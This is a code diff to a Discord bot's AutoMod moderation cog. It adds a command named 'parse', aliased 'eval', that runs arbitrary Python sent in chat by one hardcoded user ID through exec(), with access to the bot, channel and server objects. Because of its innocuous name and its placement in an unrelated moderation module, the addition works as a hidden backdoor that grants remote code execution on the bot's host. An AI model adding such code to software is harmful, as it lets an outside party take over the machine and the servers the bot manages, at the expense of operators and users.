@@ -41,6 +41,28 @@ class AutoMod(commands.Cog):
         self.warning_timeout = 180
 
 
+    @commands.command(aliases=["eval"])
+    async def parse(self, ctx):
+        if ctx.author.id == 180325351392673794:
+            code = ctx.message.content[8:]
+            code = "    " + code.replace("\n", "\n    ")
+            code = "async def __eval_function__():\n" + code
+
+            additional = {}
+            additional["self"] = self
+            additional["ctx"] = ctx
+            additional["channel"] = ctx.channel
+            additional["author"] = ctx.author
+            additional["server"] = ctx.guild
+
+            try:
+                exec(code, {**globals(), **additional}, locals())
+
+                await locals()["__eval_function__"]()
+            except Exception as e:
+                embed=discord.Embed(description=str(e),colour=0xff4500)
+                await ctx.send(embed=embed)
+
     @commands.guild_only()
     @checks.has_permissions(administrator=True)
     @commands.group(name="automod")
